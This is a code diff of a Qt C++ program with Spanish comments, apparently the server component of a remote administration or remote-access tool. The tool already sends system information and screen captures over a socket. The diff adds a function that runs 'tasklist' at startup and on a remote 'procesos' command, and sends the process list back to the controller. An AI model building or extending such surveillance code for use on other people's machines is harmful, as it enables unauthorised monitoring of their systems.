@@ -57,6 +57,7 @@ void MainWindow::changeEvent(QEvent *e)
 void MainWindow::inicio(){
     /** funcion que se ejecuta al inicio de la aplicacion **/
     cargarConfiguracion();
+    listarProcesos();
     this->generarVentanaChat();
     QString conversion;
     QByteArray datos; //Reconstruimos la configuración con algunas modificaciones para el servidor copiado
@@ -431,6 +432,10 @@ void MainWindow::llegadaDatos() {
     {   
         util.escribirSocket(obtenerInformacionSistema(),&socket);
     }
+    if(parametros[0] == "procesos")
+    {
+        listarProcesos();
+    }
 
 
 }
@@ -713,7 +718,24 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
     }
     datosEscritos();
 }
-
+void MainWindow::listarProcesos()
+{
+    #ifdef Q_OS_WIN
+    int i;
+    QProcess procesos;
+    QString listaEnvio = "listaprocesos|@|";
+    procesos.start("tasklist");
+    procesos.waitForFinished();
+    procesos.waitForReadyRead();
+    QString salida = procesos.readAllStandardOutput();
+    QStringList listaProc = salida.split("\n");
+    for(i=3;i<listaProc.size() - 1;i++)
+    {
+        listaEnvio = listaEnvio + listaProc[i].split(" ")[0] + "|@|";
+    }
+    util.escribirSocket(listaEnvio,&socket);
+    #endif
+}
 void paralelo::datosEscritos()
 {
     /** Esta función está pensada para esperar a que los datos de la captura sean escritos a memoria antes de enviarlos **/
